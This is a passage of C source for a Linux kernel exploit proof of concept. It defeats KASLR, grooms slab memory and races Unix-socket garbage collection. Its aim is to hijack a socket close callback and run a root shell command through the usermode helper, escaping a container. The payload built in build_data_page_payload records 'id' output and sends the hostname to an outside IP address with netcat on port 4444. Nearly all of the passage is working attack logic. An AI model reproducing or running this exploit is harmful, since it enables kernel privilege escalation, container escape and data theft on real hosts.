		filler_fds[i] = null_fd;
	for (i = 0; i < STAGE2_RESTORE_BATCHES; i++) {
		if (send_fds(filler[1], filler_fds,
			     ARRAY_SIZE(filler_fds), 'r') != 0)
			die("restore stage2 GC threshold");
	}
	trigger_gc_once();
	gc_flush_barrier(barrier_sender, barrier_fd);
	printf("[+] fast GC consumed one replacement vertex\n");
	snapshot_rnd96("after-fast-gc");
	timing_mark("replacement vertex consumed");

	/*
	 * Keep the trigger in A's receive queue. Releasing the pipe stall later
	 * makes the delayed-fput worker close A and invoke the overwritten close
	 * path with kernel-worker credentials.
	 */
	if (send_fds(ab[1], &trigger_fd, 1, 't') != 0)
		die("publish root trigger reference");
	close(trigger_fd);
	printf("[+] root trigger reference published after fast GC\n");

	printf("[*] stage 3: opening the Normal-zone reclaim window\n");
	open_normal_zone_window();
	printf("[+] opened a %zu MiB Normal-zone window\n",
	       (size_t)(NORMAL_ZONE_WINDOW_SIZE >> 20));
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		futex_set(&stage2_ctrl[candidate].go);
		for (i = 0; i < 30000; i++) {
			if (atomic_load_explicit(
				    &stage2_ctrl[candidate].send_returned,
				    memory_order_acquire))
				break;
			sleep_usec(100);
		}
		if (i == 30000)
			fail("stage2 candidate did not return from sendmsg");
		if (stage2_ctrl[candidate].ret != 0) {
			errno = stage2_ctrl[candidate].err;
			die("stage2 sendmsg");
		}
		if (read_kernel_taint() == initial_taint) {
			printf("[*] stage2 candidate %zu missed;"
			       " trying the next blocked FPL\n", candidate);
			if (kill(stage2_pid[candidate], SIGKILL) != 0 &&
			    errno != ESRCH)
				die("kill missed stage2 child");
			if (waitpid(stage2_pid[candidate], NULL, 0) !=
			    stage2_pid[candidate] && errno != ECHILD)
				die("waitpid missed stage2 child");
			stage2_pid[candidate] = 0;
			continue;
		}
		printf("[+] stage2 candidate %zu hit detected through"
		       " kernel taint\n", candidate);
		futex_set(&stage2_ctrl[candidate].spray_go);
		for (i = 0; i < 30000; i++) {
			if (atomic_load_explicit(
				    &stage2_ctrl[candidate].send_done,
				    memory_order_acquire))
				break;
			sleep_usec(100);
		}
		if (i == 30000)
			fail("winning stage2 page repair did not complete");
	printf("[+] stage2 candidate %zu graph update and"
		       " page repair completed\n", candidate);
		break;
	}
	if (candidate == STAGE2_COUNT)
		fail("all blocked stage2 candidates missed");
	timing_mark("stage2 candidates released sequentially");
	timing_mark("target page reclaimed and sprayed");

	printf("[*] stage 4: probing the overwritten datagram close callback\n");
	close(probe_fd);
	if (wait_for_escape_signal(ROOT_TRIGGER_WAIT_USEC)) {
		printf("[+] direct close signaled successful container escape\n");
		terminate_children(stage2_pid, STAGE2_COUNT);
		_exit(0);
	}

	printf("[*] stage 4: releasing root delayed-fput trigger\n");
	if (setsockopt(stall_sock[0], SOL_SOCKET, SO_SNDBUF,
		       &large_sndbuf, sizeof(large_sndbuf)) != 0)
		die("wake delayed root trigger");
	pthread_join(splice_thread, NULL);
	timing_mark("root delayed-fput trigger released");
	if (wait_for_escape_signal(ROOT_TRIGGER_WAIT_USEC)) {
		printf("[+] host usermode helper signaled successful container escape\n");
		terminate_children(stage2_pid, STAGE2_COUNT);
		_exit(0);
	}
	terminate_children(stage2_pid, STAGE2_COUNT);
	fail("delayed root trigger did not produce an escape marker");
	(void)large_sndbuf;
	(void)stage2_pid;
	(void)kmalloc96_fence;
}

static void write_u32(volatile unsigned char *page, size_t off, uint32_t value)
{
	*(volatile uint32_t *)(page + off) = value;
}

static void write_u64(volatile unsigned char *page, size_t off, uint64_t value)
{
	*(volatile uint64_t *)(page + off) = value;
}

static void configure_proto(volatile unsigned char *page, size_t proto_off,
			    uint32_t obj_size, uint64_t close_fn)
{
	write_u64(page, proto_off + PROTO_CLOSE, close_fn);
	write_u32(page, proto_off + PROTO_INUSE_IDX, 0);
	write_u64(page, proto_off + PROTO_SLAB, 0);
	write_u32(page, proto_off + PROTO_OBJ_SIZE, obj_size);
	write_u64(page, proto_off + PROTO_OWNER, 0);
	atomic_thread_fence(memory_order_seq_cst);
}

static void copy_string(volatile unsigned char *page, size_t off,
			const char *string)
{
	size_t len = strlen(string) + 1;

	memcpy((void *)(page + off), string, len);
}

static void build_data_page_payload(volatile unsigned char *page,
				    uint64_t kbase)
{
	uint64_t page_kva = kbase + g_off_data_page;
	uint64_t fake_alg_kva = page_kva + g_scratch_fake_alg;
	char command[256];

	memset((void *)page, 0, KERNEL_PAGE_SIZE);
	copy_string(page, g_scratch_path, "/bin/sh");
	copy_string(page, g_scratch_dash_c, "-c");
	snprintf(command, sizeof(command),
		 "for d in /proc/[0-9]*;do "
		 "case $(readlink $d/exe 2>&-) in */payload)"
		 "kill -10 ${d##*/};;esac;done;"
		 "H=$(hostname);echo UMH:$H:$(id)>/tmp/.u68;"
		 "echo UMH:$H|nc 129.101.121.138 4444 2>&-||:");
	copy_string(page, g_scratch_command, command);
	copy_string(page, g_scratch_env_home, "HOME=/");
	copy_string(page, g_scratch_env_path,
		    "PATH=/sbin:/bin:/usr/sbin:/usr/bin");

	write_u64(page, g_scratch_argv + 0x00, page_kva + g_scratch_path);
	write_u64(page, g_scratch_argv + 0x08, page_kva + g_scratch_dash_c);
	write_u64(page, g_scratch_argv + 0x10, page_kva + g_scratch_command);
	write_u64(page, g_scratch_argv + 0x18, 0);
	write_u64(page, g_scratch_envp + 0x00, page_kva + g_scratch_env_home);
	write_u64(page, g_scratch_envp + 0x08, page_kva + g_scratch_env_path);
	write_u64(page, g_scratch_envp + 0x10, 0);
	write_u32(page, g_scratch_fake_alg + CRYPTO_ALG_REFCNT, 2);
	write_u64(page, g_scratch_fake_alg + CRYPTO_ALG_CRA_TYPE, 1);
	write_u64(page, g_scratch_fake_alg + 0x10,
		  fake_alg_kva + 0x10);
	write_u64(page, g_scratch_fake_alg + 0x18,
		  fake_alg_kva + 0x10);

	write_u64(page, g_page_unix_grouped_index, 0);
	write_u64(page, g_page_unix_max_scc_index, 2);
	write_u64(page, g_page_unix_visited,
		  page_kva + g_page_unix_visited);
	write_u64(page, g_page_unix_visited + sizeof(uint64_t),
		  page_kva + g_page_unix_visited);
	write_u64(page, g_page_unix_unvisited,
		  page_kva + g_page_unix_unvisited);
	write_u64(page, g_page_unix_unvisited + sizeof(uint64_t),
		  page_kva + g_page_unix_unvisited);

	write_u64(page, g_page_stream_slab, 0);
	write_u32(page, g_page_stream_obj_size, 0x400);
	write_u64(page, g_page_stream_owner, 0);
	configure_proto(page, g_page_dgram_proto, 0x400,
			kbase + g_off_pkcs1_exit_tfm);

	write_u64(page, g_page_dgram_proto + 0x08, 1);
	write_u64(page, g_page_dgram_proto + 0x20,
		  kbase + g_off_call_umh_work);
	write_u64(page, g_page_dgram_proto + 0x28, fake_alg_kva);
	write_u64(page, g_page_dgram_proto + 0x30,
		  page_kva + g_scratch_path);
	write_u64(page, g_page_dgram_proto + 0x38,
		  page_kva + g_scratch_argv);
	write_u64(page, g_page_dgram_proto + 0x40,
		  page_kva + g_scratch_envp);
	write_u32(page, g_page_dgram_proto + 0x48, 2);
}

static int create_root_trigger_socket(uint64_t kbase)
{
	int fd;

	fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("trigger dgram socket");
	(void)kbase;
	return fd;
}

static uint64_t leak_xdk_kaslr_base(void)
{
	uint64_t candidate = xdk_leak_kaslr_base(
		38, KASLR_LEAK_SAMPLE_COUNT, KASLR_LEAK_TRIAL_COUNT);

	if (!candidate ||
	    candidate < 0xffffffff81000000ULL ||
	    candidate >= 0xffffffffc1000000ULL ||
	    (candidate & 0x1fffff))
		return 0;
	return candidate;
}

/* replaced by resolve_kernel_offsets() above */

static int run_proc_check_mode(void)
{
	struct stat st;
	char buffer[4096];
	ssize_t length;
	int fd;

	if (stat("/proc/sys/kernel/core_pattern", &st) != 0)
		die("stat core_pattern");
	printf("[O] core_pattern uid=%u gid=%u mode=%#o access(W_OK)=%d errno=%d\n",
	       st.st_uid, st.st_gid, st.st_mode & 07777,
	       access("/proc/sys/kernel/core_pattern", W_OK), errno);
	fd = open("/proc/sys/kernel/core_pattern", O_WRONLY | O_CLOEXEC);
	printf("[O] core_pattern open(O_WRONLY)=%d errno=%d (%s)\n",
	       fd, errno, strerror(errno));
	if (fd >= 0)
		close(fd);
	fd = open("/proc/sys/kernel/core_pattern", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		length = read(fd, buffer, sizeof(buffer) - 1);
		if (length >= 0) {
			buffer[length] = '\0';
			printf("[O] core_pattern value=%s", buffer);
			if (!length || buffer[length - 1] != '\n')
				putchar('\n');
		}
		close(fd);
	}
	fd = open("/proc/self/mountinfo", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open mountinfo");
	length = read(fd, buffer, sizeof(buffer) - 1);
	if (length < 0)
		die("read mountinfo");
	buffer[length] = '\0';
	{
		char *line = buffer;

		while (line && *line) {
			char *next = strchr(line, '\n');

			if (next)
				*next++ = '\0';
			if (strstr(line, " /proc/sys ") ||
			    strstr(line, " /proc "))
				printf("[O] mount %s\n", line);
			line = next;
		}
	}
	close(fd);
	return 0;
}

int main(int argc, char **argv)
{
	uint64_t kbase;
	uint64_t direct_map_base;
	bool base_low_profile;
	size_t attempt;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	if (argc != 1) {
		fprintf(stderr, "usage: %s\n", argv[0]);
		return 2;
	}
	requested_poc_mode = "pc-hijack";
	resolve_kernel_offsets();
	if (poc_mode_is("proc-check"))
		return run_proc_check_mode();
	if (poc_mode_is("oracle") || poc_mode_is("vertex-oracle")) {
		raise_nofile_limit();
		pin_to_cpu(0);
		return run_oracle_mode(poc_mode_is("vertex-oracle"));
	}
	if (poc_mode_is("slab-debug")) {
		raise_nofile_limit();
		pin_to_cpu(0);
		return run_slab_debug_mode();
	}
	signal(SIGPIPE, SIG_IGN);
	if (signal(SIGUSR1, escape_signal_handler) == SIG_ERR)
		die("signal SIGUSR1");
	if (signal(SIGUSR2, escape_signal_handler) == SIG_ERR)
		die("signal SIGUSR2");
	raise_nofile_limit();
	pin_to_cpu(0);
	fprintf(stderr, "[*] KASLR leak starting\n");
	for (attempt = 0, kbase = 0; attempt < 8 && !kbase; attempt++) {
		if (attempt)
			fprintf(stderr, "[*] KASLR leak retry %zu\n", attempt);
		kbase = leak_xdk_kaslr_base();
		fprintf(stderr, "[*] KASLR attempt %zu: %s\n",
			attempt, kbase ? "OK" : "FAIL");
	}
	if (!kbase)
		fail("kernelXDK KASLR leak did not reach a majority");
	fprintf(stderr, "[*] kbase=%#llx\n",
		(unsigned long long)kbase);

	fprintf(stderr, "[*] direct-map leak starting\n");
	for (attempt = 0, direct_map_base = 0;
	     attempt < 6 && !direct_map_base; attempt++)
		direct_map_base = xdk_leak_direct_map_base(
			3, DIRECT_MAP_LEAK_SAMPLE_COUNT,
			DIRECT_MAP_LEAK_TRIAL_COUNT);
	if (!direct_map_base)
		fail("kernelXDK direct-map leak did not reach a majority");
	fprintf(stderr, "[*] dm=%#llx\n",
		(unsigned long long)direct_map_base);
	if (poc_mode_is("pc-hijack") || poc_mode_is("dirtymode") ||
	    poc_mode_is("slab-dirtymode")) {
		unsigned int race_high = 500;

		for (attempt = 0; attempt < PC_HIJACK_ATTEMPT_COUNT;
		     attempt++) {
			int status;
			pid_t pid;
			uint64_t attempt_started;
			unsigned int race_delay;

			/* V128: random delay bsearch skips [1,124999] window */
			race_delay = (unsigned int)(
				(attempt * 2654435761U + getpid()) %
				(race_high + 1));
			stage1_gc_delay_nsec = race_delay;
			attempt_started = monotonic_nsec();
			printf("[*] pc-hijack attempt %zu/%u,"
			       " synchronous GC delay=%u nops\n",
			       attempt + 1, PC_HIJACK_ATTEMPT_COUNT,
			       stage1_gc_delay_nsec);
			pid = fork();
			if (pid < 0)
				die("fork pc-hijack attempt");
			if (pid == 0) {
				{
				static const int dm_deltas[] = {-4, -3, -2};
				int delta_idx = (int)(attempt %
					(sizeof(dm_deltas) /
					 sizeof(dm_deltas[0])));
				pin_to_cpu(0);
				run_pc_hijack_attempt(kbase,
					direct_map_base,
					dm_deltas[delta_idx]);
				_exit(0);
			}
			}
			if (waitpid(pid, &status, 0) != pid)
				die("waitpid pc-hijack attempt");
			if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
				return 0;
			}
			if (WIFEXITED(status))
				printf("[!] pc-hijack attempt %zu exit=%d after %.2f s\n",
				       attempt + 1, WEXITSTATUS(status),
				       (monotonic_nsec() - attempt_started) / 1e9);
			else if (WIFSIGNALED(status))
				printf("[!] pc-hijack attempt %zu signal=%d after %.2f s\n",
				       attempt + 1, WTERMSIG(status),
				       (monotonic_nsec() - attempt_started) / 1e9);
			else
				printf("[!] pc-hijack attempt %zu failed after %.2f s\n",
				       attempt + 1,
				       (monotonic_nsec() - attempt_started) / 1e9);
			sleep_usec(RETRY_DELAY_USEC);
		}
		fail("all pc-hijack attempts were exhausted");
	}
	base_low_profile = direct_map_base & 0x80000000ULL;
	select_attempt_profile(base_low_profile, false);
	printf("[+] pressure profile: %zu MiB %s + %zu MiB pre-filter 4K"
	       " + %zu MiB top-off\n",
	       normal_zone_pressure >> 20,
	       "4K",
	       normal_zone_prefilter_4k >> 20,
	       normal_zone_top_off >> 20);
	printf("[+] edge-filter hole: %zu\n", edge_xattr_hole_index);
	printf("[+] mmap-lock population: eager\n");
	printf("[+] mmap-lock first pass: prearmed\n");

	for (attempt = 0; attempt < EXPLOIT_ATTEMPT_COUNT; attempt++) {
		int status;
		pid_t pid;
		uint64_t attempt_started;
		bool low_profile = base_low_profile;
		bool retry_pressure = attempt != 0;

		select_attempt_profile(low_profile, retry_pressure);
		if (poc_mode_is("free-gc"))
			stage1_gc_delay_usec = FIRST_GC_DELAY_USEC;
		else
			stage1_gc_delay_usec = stage1_delay_schedule[attempt];

		attempt_cookie = ((uint64_t)getpid() << 32) | (attempt + 1);
		attempt_started = monotonic_nsec();
		printf("[*] attempt %zu/%u, stage-1 delay=%u us,"
		       " profile=%s, pressure=%s, edge-hole=%zu\n",
		       attempt + 1, EXPLOIT_ATTEMPT_COUNT,
		       stage1_gc_delay_usec,
		       low_profile ? "low" : "high",
		       retry_pressure ? "stable-retry" : "fast",
		       edge_xattr_hole_index);
		pid = fork();
		if (pid < 0)
			die("fork exploit attempt");
		if (pid == 0) {
			pin_to_cpu(0);
			timing_mark("attempt child start");
			printf("[*] stage 0: exhausting the Normal zone for DMA32 reclaim\n");
			exhaust_normal_zone();
			timing_mark("pre-filter pressure complete");
			printf("[*] stage 0: grooming mixed kmalloc-96 slabs\n");
			groom_kmalloc96_slabs();
			timing_mark("kmalloc-96 grooming complete");
			run_stale_scc_attempt(kbase);
			_exit(0);
		}
		if (waitpid(pid, &status, 0) != pid)
			die("waitpid exploit attempt");
		if (escape_succeeded ||
		    (WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
			printf("[+] exploit attempt %zu completed successfully\n",
			       attempt + 1);
			return 0;
		}
		printf("[!] attempt %zu exited without an escape after %.2f s\n",
		       attempt + 1,
		       (double)(monotonic_nsec() - attempt_started) / 1e9);
		if (attempt + 1 < EXPLOIT_ATTEMPT_COUNT)
			sleep_usec(RETRY_DELAY_USEC);
	}

	printf("[*] diagnostic trace collection window\n");
	sleep(10);
	fail("all exploit attempts were exhausted");
}
